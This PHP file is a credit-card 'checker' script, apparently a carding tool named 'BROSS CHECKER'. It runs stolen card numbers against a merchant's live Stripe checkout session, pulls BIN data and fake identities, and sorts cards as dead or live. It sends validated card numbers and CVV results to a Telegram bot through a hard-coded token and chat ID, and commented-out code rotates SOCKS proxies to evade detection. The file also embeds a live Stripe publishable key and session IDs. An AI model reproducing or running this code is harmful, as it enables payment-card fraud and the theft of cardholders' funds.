<?php
//===================== [ BROSS CHECKER ] ====================//
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
//================ [ FUNCTIONS & LISTA ] ===============//
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
function handleError() {
  // Do something to handle the error, such as logging it or displaying an error message to the user
  error_log('Error occurred while making the HTTP request');
}
/*///////////////////////////////////////////////////////////////////
function rebootproxys($retry = 0) {
  $proxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($proxySocks) - 1);
  $proxySocks = trim($proxySocks[$myproxy]); // remove any leading/trailing whitespace

   // check if proxy server is working
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
  curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
  curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $ip1 = curl_exec($ch);
  $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);
  if ($http_code == 200 && !empty($ip1)) {
    return $ip1;
  } else {
    if ($retry < 10) {
      // Retry up to 3 times if the IP is not working
      return rebootproxys($retry + 1);
    } else {
      return false;
    }
  }
}
$retryCount = 0;
while ($retryCount < 10) {
  $proxyIP = rebootproxys();
  if ($proxyIP) {
    
  } else {
    $retryCount++;
  }
}
if ($retryCount == 10) {
  echo "Failed to select a working proxy server after 10 retries. Exiting.\n";
  exit();
}
/////////////////////////////////////////////////////////////////////////////////////////////////*/
$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
    $amt = '1';
    $chr = $amt * 100;
}
$amtMap = array(
    '0.5' => '050',
    '0.6' => '060',
    '0.7' => '070',
    '0.8' => '080',
    '0.9' => '090',
    '1' => '100',
    '2' => '200',
    '3' => '300',
    '4' => '400',
    '5' => '500',
    '6' => '600',
    '7' => '700',
    '8' => '800',
    '9' => '900',
    '10' => '1000'
);
$amt = $amtMap[$amt] ?? '';
$sk = $_GET['skgate'];
$lista = $_GET['lista'];
$crn = $_GET['crn'];
if(empty($crn)) {
    $crn = 'usd';
}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
////////////////////////////////////////
////////////=======[bin data]=======/////////////////////////////
$bin_limit_reached = false;
while (!$bin_limit_reached) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $response = curl_exec($ch); 
    /////echo "<br><b>Response: </b> $response<br>";
    curl_close($ch);
    $prepaid = GetStr($response, '"prepaid":', ',');
    $bank = GetStr($response, '"bank":{"name":"', '"');
    $country = GetStr($response, '"name":"', '"');
    $country2 = str_replace(" ", "-", strtolower(GetStr($response, '"name":"', '"')));
    $type = GetStr($response, '"type":"', '"');
    $Emoji = GetStr($response, '"emoji":"','"');
    $ci = " $bank ┃ $type ┃ $country ┃ $Emoji ┃ $prepaid ";
    ////echo $ci;
if (strpos($response, '"type":"')) {
            $bin_limit_reached = true;
            
        } else {
            $bin_limit_reached = false;
        }
    }
////////////////////////////===[Random User ]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//////////////////////////////////////////
//================= [ CURL REQUESTS ] =================//

  $ch = curl_init();
  ///curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
  ///curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=BRASSFILL+CODARI&billing_details[email]=elhoussbr4%40gmail.com&billing_details[address][country]=US&billing_details[address][line1]=street+645&billing_details[address][city]=New+York&billing_details[address][postal_code]=10036&billing_details[address][state]=NY&key=pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n&payment_user_agent=stripe.js%2F34157a4a07%3B+stripe-js-v3%2F34157a4a07%3B+checkout');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'origin: https://pay.openai.com',
'referer: https://pay.openai.com/',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
   ));
   $r1 = curl_exec($ch);
echo "<b>r1: </b> $r1<br>";
  $s = json_decode($r1, true);
  $token = $s['id'];
$msg1 = Getstr($r1,'"message": "','"');
$para = Getstr($r1, ' "param": "','"');
$country1 = Getstr($r1, ' "country": "','"');
$type1 = Getstr($r1, ' "funding": "','"');
$resp1 = Getstr($r1,'"decline_code": "','"');
$ch = curl_init();
  ////curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
  /////curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/cs_live_a1SKdkxF96AIIk8BLD6lyqpCDhCNa0eWLcFDCV5Iyzt7G3uo5MPsBg3cqt/confirm');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$token.'&expected_amount=2178&expected_payment_method_type=card&key=pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_pages/cs_live_a1SKdkxF96AIIk8BLD6lyqpCDhCNa0eWLcFDCV5Iyzt7G3uo5MPsBg3cqt/confirm',
'scheme: https',
'origin: https://pay.openai.com',
'referer: https://pay.openai.com/',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
   ));
   $r2 = curl_exec($ch);
   $chtoken = Getstr($r2,'"url": "/v1/charges/','/refunds"');
$pp = Getstr($r2,'"three_d_secure_2_source": "','"');
$token2 = Getstr($r2,'"capture_method": "automatic",
    "client_secret": "pi','",');
preg_match('/"risk_score": (\d+)/', $r2, $matches);
$risk_score = $matches[1];
$msg2 = Getstr($r2,'"seller_message": "','"');
if(empty($msg2)) {
    $msg2 = Getstr($r2,'"message": "','"');
}
$cvc = Getstr($r2,'"cvc_check": "','"');
$rule = Getstr($r2,'"rule": "','"');
$resp2 = Getstr($r2,'"decline_code": "','"');
$receipturl = trim(strip_tags(getStr($r2,'"receipt_url": "','"')));
echo "<b>r2: </b> $r2<br>";
  $s = json_decode($r2, true);
  ///////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
  ////curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
  /////curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/cs_live_a1SKdkxF96AIIk8BLD6lyqpCDhCNa0eWLcFDCV5Iyzt7G3uo5MPsBg3cqt?key=pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n&eid=NA');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'key=pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n&eid=NA');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: GET',
'path: /v1/payment_pages/cs_live_a1SKdkxF96AIIk8BLD6lyqpCDhCNa0eWLcFDCV5Iyzt7G3uo5MPsBg3cqt?key=pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n&eid=NA',
'scheme: https',
'origin: https://pay.openai.com',
'referer: https://pay.openai.com/',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
   ));
$r3 = curl_exec($ch);
echo "<b>r3: </b> $r3<br>";

if (strpos($r1, '"card_not_supported"') || strpos($r1, '"invalid_expiry_year"') || strpos($r1, '"invalid_cvc"') || strpos($r1, '"invalid_expiry_month"') || strpos($r1, '"incorrect_number"') || strpos($r1, '"generic_decline"') || strpos($r1, '"parameter_invalid_integer"')) {
    
    echo '<span style="color:red">========================================<br>RESULT: #DEAD ❌ <br> ➔CARD:- '.$lista.' <br> ➔MASSAGE: '.$resp1.' ┃ '.$msg1.'<br> ➔BIN DATA: '.$ci.'</span><br>';

}
elseif (strpos($r2, '"invalid_account"') || strpos($r2, '"expired_card"') || strpos($r2, '"pickup_card"') || strpos($r2, '"incorrect_number"') || strpos($r2, '"lost_card"') || strpos($r2, '"generic_decline"') || strpos($r2, '"stolen_card"') || strpos($r2, '"card_not_supported"') || strpos($r2, '"card_decline_rate_limit_exceeded"')) {
    
    echo '<span style="color:red">========================================<br>RESULT: #DEAD ❌ <br> ➔CARD:- '.$lista.' <br> ➔MASSAGE: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'</span><br>';
}
/////////////////=====[CCN]=====///////////////
elseif (strpos($r2,'"do_not_honor"') || strpos($r2,'"incorrect_cvc"') || strpos($r2, '"invalid_cvc"')) {
      
    $sendccn = true;
    echo '<span style="color:Aqua">========================================<br>RESULT: #CCN ❎ <br> ➔CARD:- '.$lista.' <br> ➔MASSAGE: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'<br>➔➔IP: '.$proxyIP.'✅👍</span><br> ';
}
/////////////////=====[CVV]=====///////////////
elseif (strpos($r2,'"insufficient_funds"') || strpos($r2,'"authentication_required"') || strpos($r2,'"transaction_not_allowed"')){
    $sendcvv = true;
    echo '<span style="color:#66ff66">========================================<br>RESULT: #CVV ✔️ <br> ➔CARD:- '.$lista.'<br> ➔MASSAGE: '.$resp2.' ┃ '.$msg2.'<br> ➔BIN DATA: '.$ci.'</span><br> ';
}
/////////////////=====[LIVE]=====///////////////
elseif (strpos($r2,'"status": "succeeded"') !== false || strpos($r2,'"seller_message": "Payment complete."') !== false || strpos($r2,'"approved_by_network"') !== false){
    
    $sendlive = true;
    echo '<span style="color:Aqua">========================================<br>RESULT: #LIVE CHARGED $$crn ✅ <br> ➔CARD:- '.$lista.'<br> ➔MASSAGE: '.$resp2.' ┃ '.$msg2.'<br>{cvc_check:'.$cvc.'}<br>[Receipt :<a href='.$receipturl.'>Here</a>]<br> ➔BIN DATA: '.$ci.'</span><br> ';
}
  #-------------------[3rd REQ]--------------------#
// Set the chat ID and token
$chatID = -1001845357353;
$token = "5856648236:AAEBqiJuFjG-17019DLpRBRi3NozM4kyJnQ";
// Set the default message and the live message
$CCNMessage = urlencode("CCN:$lista \n[$resp2]\n[$msg2]\n[risk_level:$riskl]\n[cvc_check=$cvc]");
$CCVMessage = urlencode("CCV:$lista \n[$resp2]\n[$msg2]\n[risk_level:$riskl]\n[cvc_check=$cvc]");
$LIVEMessage = urlencode("LIVE:$lista \n[$resp2]\n[$msg2]\n[risk_level:$riskl]\n[cvc_check=$cvc]\nREFONDED= YES");
// Perform the request and get the result
$result = getResult();
// Check if the $sendlive variable is true
if ($sendcvv === true) {
    // Send the live message
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$CCVMessage";
    $response = file_get_contents($apiUrl);
}
elseif ($sendlive === true ) {
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$LIVEMessage";
    $response = file_get_contents($apiUrl);
}
elseif ($sendccn === true) {
    // Send the default message
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$CCNMessage";
    $response = file_get_contents($apiUrl);
}
// The getResult function
function getResult() {
    // Perform the request and return the result
    // Replace this with your actual code to get the result
    return "This is a test result";
}
curl_close($ch);
ob_flush();
?>